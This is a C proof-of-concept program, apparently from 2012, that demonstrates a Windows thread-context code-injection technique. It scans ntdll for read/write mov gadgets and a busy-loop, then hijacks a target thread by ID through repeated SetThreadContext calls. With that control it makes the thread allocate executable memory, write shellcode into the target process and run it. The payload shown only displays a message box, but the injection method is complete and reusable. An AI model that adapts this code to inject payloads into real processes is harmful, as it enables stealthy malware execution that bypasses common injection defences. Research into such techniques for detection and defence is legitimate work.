// required for OpenThread
#define _WIN32_WINNT 0x0500

#include <stdio.h>
#include <windows.h>

// Thread Context ALL The Things Proof of Concept
// (C) 2012 Jurriaan Bremer

// for more information on the so-called mod R/M byte (the one used to decode
// the operands to the mov instruction), see the following link.
// http://www.sandpile.org/x86/opc_rm.htm

// http://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
#define MEM_EXECUTABLE (PAGE_EXECUTE | PAGE_EXECUTE_READ | \
    PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)

// this is the minimum required thread access for our Proof of Concept.
// http://msdn.microsoft.com/en-us/library/windows/desktop/ms686769(v=vs.85).aspx
#define THREAD_REQUIRED_ACCESS (THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | \
    THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION)

#define sizeofarray(arr) (sizeof(arr) / sizeof((arr)[0]))

typedef struct _gadget_t {
    unsigned char *addr;
    int disp;
    int src;
    int dst;
} gadget_t;

// general purpose registers, sorted by index
const char *reg32[] = {
    "eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi",
};

int wait_for_address(HANDLE thread_handle, unsigned char *addr)
{
    while (1) {
        CONTEXT ctx = {CONTEXT_FULL};

        // yes, in this case we can actually get the thread context
        // without suspending it first
        if(GetThreadContext(thread_handle, &ctx) == FALSE) {
            printf("Error obtaining thread.. 0x%08x\n", GetLastError());
            CloseHandle(thread_handle);
            return 0;
        }

        // did the thread get to our busy-loop yet?
        if(ctx.Eip == (unsigned long) addr) {
            // cool, time to suspend and break out of this loop
            if(SuspendThread(thread_handle) == (DWORD) -1) {
                printf("Error suspending thread.. 0x%08x\n",
                    GetLastError());
                CloseHandle(thread_handle);
                return 0;
            }

            break;
        }

        // sleep a small amount of time, so we don't get 99% cpu
        Sleep(1);
    }
    return 1;
}

int write_dword(HANDLE thread_handle, unsigned char *addr, int stack_reserve,
        unsigned long value, gadget_t *gadget, unsigned char *busy_loop,
        const CONTEXT *orig_ctx)
{
    // create a temporary thread context
    CONTEXT ctx = *orig_ctx;

    // since the context structure doesn't have a "normal" layout for the
    // registers, e.g. such as seen in the reg32 array above, we will use a
    // simple lookup table..
    unsigned long *ctx_reg[] = {
        &ctx.Eax, &ctx.Ecx, &ctx.Edx, &ctx.Ebx,
        &ctx.Esp, &ctx.Ebp, &ctx.Esi, &ctx.Edi,
    };

    // allocate space for our values
    ctx.Esp -= stack_reserve;

    // set the instruction pointer to the write gadget
    ctx.Eip = (unsigned long) gadget->addr;

    // set the destination memory address register, the mov instruction
    // will look like the following.
    //    mov dword [write_dst+write_disp], write_src
    // and we want to write to esp+i*4, so we have to subtract the
    // displacement from the address, note that the gadget_ctx_reg is a
    // lookup table which points to the gadget_ctx context structure
    *ctx_reg[gadget->dst] = (unsigned long) addr - gadget->disp;

    // set the source operand
    *ctx_reg[gadget->src] = value;

    // set the new thread context and resume the thread
    if(SetThreadContext(thread_handle, &ctx) == FALSE) {
        printf("Error setting thread context.. 0x%08x\n", GetLastError());
        // do note that this is kind of useless.. as the thread is useless
        // now anyway and the application might not work anymore anyway
        CloseHandle(thread_handle);
        return 0;
    }

    // resume the thread..
    if(ResumeThread(thread_handle) == (DWORD) -1) {
        printf("Error resuming thread.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    if(wait_for_address(thread_handle, busy_loop) == 0) {
        return 0;
    }

    return 1;
}


int main(int argc, char *argv[])
{
    if(argc != 2) {
        printf("Usage: %s <threadid>\n", argv[0]);
        return 0;
    }

    MEMORY_BASIC_INFORMATION mbi = {};
    unsigned char *addr;

    // address of the busy loop
    unsigned char *busy_loop = NULL;

    // read_gadget: mov read_dst, dword [read_src+read_disp]
    // write_gadget: mov dword [write_dst+write_disp], write_src
    gadget_t read_gadget = {}, write_gadget = {};

    // enumerate all the sections of the ntdll library loaded in memory
    for (addr = (unsigned char *) GetModuleHandle("ntdll");
            VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi) &&
            mbi.Type == MEM_IMAGE; addr += mbi.RegionSize) {

        // only process further if these pages are executable
        if(mbi.Protect & MEM_EXECUTABLE) {
            for (unsigned char *p = addr; p < addr + mbi.RegionSize; p++) {
                // is there a busy-loop at the current address?
                if(*p == 0xeb && p[1] == 0xfe) {
                    busy_loop = p;
                }
                // is there a 32bit mov instruction at this address?
                else if(*p == 0x8b || *p == 0x89) {
                    // extract mod R/M byte information
                    int rm = p[1] & 7;
                    int value = (p[1] >> 3) & 7;
                    int mod = p[1] >> 6;

                    // check if this is a potential read or write gadget
                    int is_read = *p == 0x8b;

                    // if we already have this type of gadget (read or write)
                    // then we skip..
                    if((is_read && read_gadget.addr != 0) || (is_read == 0 &&
                            write_gadget.addr != 0)) {
                        continue;
                    }

                    // calculate the length of the mov instruction; one byte
                    // for the instruction itself, one byte for the mod R/M
                    // byte and optionally one or four bytes for the
                    // displacement
                    int len = 2 + (mod == 1 ? 1 : 0) + (mod == 2 ? 4 : 0);

                    // next instruction is located after this instruction
                    unsigned char *p2 = p + len;

                    // volatile registers only
                    if((rm != 3 && rm != 5 && rm != 6 && rm != 7) ||
                            (value != 3 && value != 5 && value != 6 &&
                            value != 7)) {
                        continue;
                    }

                    // We don't want a general purpose register for the rm
                    // value. Besides that, I lied, we don't support SIB at
                    // the moment (again, for SIB, see the documentation on
                    // sandpile.org, or perhaps the intel docs.)
                    if(mod != 3 && rm != 4) {

                        // now we have found the mov instruction, let's see
                        // if it's followed by a return instruction. If it is
                        // then the `value' and the `rm' from the mod R/M byte
                        // cannot be esp.
                        if((*p2 == 0xc3 || *p2 == 0xc2) && value != 4 &&
                                rm != 4) {

                            // we found a read or write gadget, depending on
                            // the `is_read' variable.

                            // obtain displacement used in the memory address
                            // we have to subtract this displacement later,
                            // e.g. if we have to following read gadget:
                            //   mov eax, dword [ebx+8]
                            // and we want to read from an address 0x11223344,
                            // then ebx should be set to 0x11223344-8
                            if(mod == 1) {
                                if(is_read) {
                                    read_gadget.disp = *(char *)(p + 2);
                                }
                                else {
                                    write_gadget.disp = *(char *)(p + 2);
                                }
                            }
                            else if(mod == 4) {
                                if(is_read) {
                                    read_gadget.disp = *(int *)(p + 2);
                                }
                                else {
                                    write_gadget.disp = *(int *)(p + 2);
                                }
                            }

                            // store the address of this gadget and mod R/M
                            // information
                            if(is_read) {
                                read_gadget.addr = p;
                                read_gadget.dst = value;
                                read_gadget.src = rm;
                            }
                            else {
                                write_gadget.addr = p;
                                write_gadget.dst = rm;
                                write_gadget.src = value;
                            }

                            if(is_read) {
                                printf("0x%08x read %s dword [%s+0x%08x]\n",
                                    p, reg32[value], reg32[rm],
                                    read_gadget.disp);
                            }
                            else {
                                printf("0x%08x write dword [%s+0x%08x] %s\n",
                                    p, reg32[value], read_gadget.disp,
                                    reg32[rm]);
                            }
                        }

                        // we were unable to find a retn instruction, but
                        // perhaps we can find a jmp instruction (although we
                        // already know this is not going to happen..)
                        else if(*p2 == 0xff && ((p2[1] >= 0xd0 &&
                                p2[1] < 0xd8) || (p2[1] >= 0xe0 &&
                                p2[1] < 0xe8))) {

                            // we found a read or write gadget, depending on
                            // the `is_read' variable.

                            printf("0x%08x %s %s dword [%s+0x%08x] %s %s\n",
                                p, is_read ? "read" : "write",
                                reg32[is_read ? value : rm],
                                reg32[is_read ? rm : value],
                                is_read ?
                                    read_gadget.disp : write_gadget.disp,
                                p2[1] < 0xe0 ? "call" : "jmp",
                                reg32[p2[1] & 7]);
                        }
                    }
                }
            }
        }
    }

    // did we find both the read and write gadgets, as well as the busy-loop
    // instruction?
    if(read_gadget.addr == NULL || write_gadget.addr == NULL ||
            busy_loop == NULL) {
        printf("Unfortunately, your ntdll is not supported!\n");
        return 0;
    }

    // open a handle to the thread
    HANDLE thread_handle = OpenThread(THREAD_REQUIRED_ACCESS, FALSE,
        atoi(argv[1]));
    if(thread_handle == NULL) {
        printf("Error opening thread handle.. 0x%08x\n", GetLastError());
        return 0;
    }

    // suspend the thread
    if(SuspendThread(thread_handle) == -1) {
        printf("Error suspending thread.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // get the thread context
    CONTEXT orig_ctx = {CONTEXT_FULL};
    if(GetThreadContext(thread_handle, &orig_ctx) == FALSE) {
        printf("Error obtaining thread context.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // a list of our five values to write
    unsigned long values[] = {
        (unsigned long) busy_loop,  // return address
        0,                          // VirtualAlloc's lpAddress
        0x1000,                     // VirtualAlloc's dwSize
        MEM_COMMIT | MEM_RESERVE,   // VirtualAlloc's flAllocationType
        PAGE_EXECUTE_READWRITE,     // VirtualAlloc's flProtect
    };

    // as we will write the busy_loop address the first time, we can cheat
    // a little bit because we will quickly write the return address of the
    // first write gadget as well

    for (int i = 0; i < sizeofarray(values); i++) {
        if(write_dword(thread_handle,
                (unsigned char *)(orig_ctx.Esp - 20 + i * sizeof(int)), 20,
                values[i], &write_gadget, busy_loop, &orig_ctx) == 0) {
            printf("Error writing dword..\n");
            CloseHandle(thread_handle);
            return 0;
        }
    }

    // all values have been written now, time to execute the actual
    // VirtualAlloc function

    CONTEXT call_ctx = orig_ctx;

    // set the instruction pointer to the function address
    call_ctx.Eip = (DWORD) GetProcAddress(GetModuleHandle("kernel32"),
        "VirtualAlloc");

    // prepare the stack correctly.. ;)
    call_ctx.Esp -= 20;

    if(SetThreadContext(thread_handle, &call_ctx) == FALSE) {
        printf("Error setting call context.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // and finally it's time to execute the VirtualAlloc function
    if(ResumeThread(thread_handle) == (DWORD) -1) {
        printf("Error resuming thread.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // wait until the busy-loop has been reached
    if(wait_for_address(thread_handle, busy_loop) == 0) {
        return 0;
    }

    // obtain thread context for the return value
    if(GetThreadContext(thread_handle, &call_ctx) == FALSE) {
        printf("Error obtaining thread context.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // read the return value
    printf("Allocated page: 0x%08x\n", call_ctx.Eax);

    // simple messagebox shellcode
    unsigned char shellcode[] = {
        0x68, 'l', 'l', 0x00, 0x00,     // push "user32.dll"
        0x68, '3', '2', '.', 'd',
        0x68, 'u', 's', 'e', 'r',
        0x54,                           // push esp
        0xb8, 0x00, 0x00, 0x00, 0x00,   // mov eax, LoadLibraryA
        0xff, 0xd0,                     // call eax
        0x68, 'm', 'e', 'r', 0x00,      // push "jbremer"
        0x68, 'j', 'b', 'r', 'e',
        0x89, 0xe3,                     // mov ebx, esp
        0x68, 'r', 'l', 'd', 0x00,      // push "hello world"
        0x68, 'o', ' ', 'w', 'o',
        0x68, 'h', 'e', 'l', 'l',
        0x89, 0xe1,                     // mov ecx, esp
        0x31, 0xc0,                     // xor eax, eax
        0x50,                           // push eax (null)
        0x53,                           // push ebx (caption)
        0x51,                           // push ecx (text)
        0x50,                           // push eax (null)
        0xb8, 0x00, 0x00, 0x00, 0x00,   // mov eax, MessageBoxA
        0xff, 0xd0,                     // call eax
        0xb8, 0x00, 0x00, 0x00, 0x00,   // mov eax, busy-loop
        0xff, 0xe0,                     // jmp eax
    };

    // fix the two addresses
    *(FARPROC *)(shellcode + 17) = GetProcAddress(LoadLibrary("kernel32"),
        "LoadLibraryA");
    *(FARPROC *)(shellcode + sizeof(shellcode) - 13) = GetProcAddress(
        LoadLibrary("user32"), "MessageBoxA");
    *(unsigned char **)(shellcode + sizeof(shellcode) - 6) = busy_loop;

    orig_ctx.ContextFlags = CONTEXT_FULL;

    // now we have to write the shellcode to the executable page
    // note that we align the size of the shellcode up to 4-byte boundary
    for (int i = 0; i < (sizeof(shellcode) + 3) / sizeof(int); i++) {
        if(write_dword(thread_handle,
                (unsigned char *)(call_ctx.Eax + i * sizeof(int)), 20,
                *(unsigned long *)(shellcode + i * sizeof(int)),
                &write_gadget, busy_loop, &orig_ctx) == 0) {
            printf("Error writing dword..\n");
            CloseHandle(thread_handle);
            return 0;
        }
    }

    // set the instruction pointer to our shellcode
    call_ctx.Eip = call_ctx.Eax;

    // set the new thread context and resume the thread
    if(SetThreadContext(thread_handle, &call_ctx) == FALSE) {
        printf("Error setting thread context.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // and finally, we execute the shellcode
    if(ResumeThread(thread_handle) == (DWORD) -1) {
        printf("Error resuming thread.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // wait until we hit the busy-loop
    if(wait_for_address(thread_handle, busy_loop) == 0) {
        return 0;
    }

    // should have VirtualFree()'d the memory page, but okayyy...
    // you can do that now, right? ;)

    // restore the original context
    if(SetThreadContext(thread_handle, &orig_ctx) == FALSE) {
        printf("Error restoring original thread context.. 0x%08x\n",
            GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    // and resume the original thread
    if(ResumeThread(thread_handle) == (DWORD) -1) {
        printf("Error resuming thread.. 0x%08x\n", GetLastError());
        CloseHandle(thread_handle);
        return 0;
    }

    CloseHandle(thread_handle);
    return 0;
}
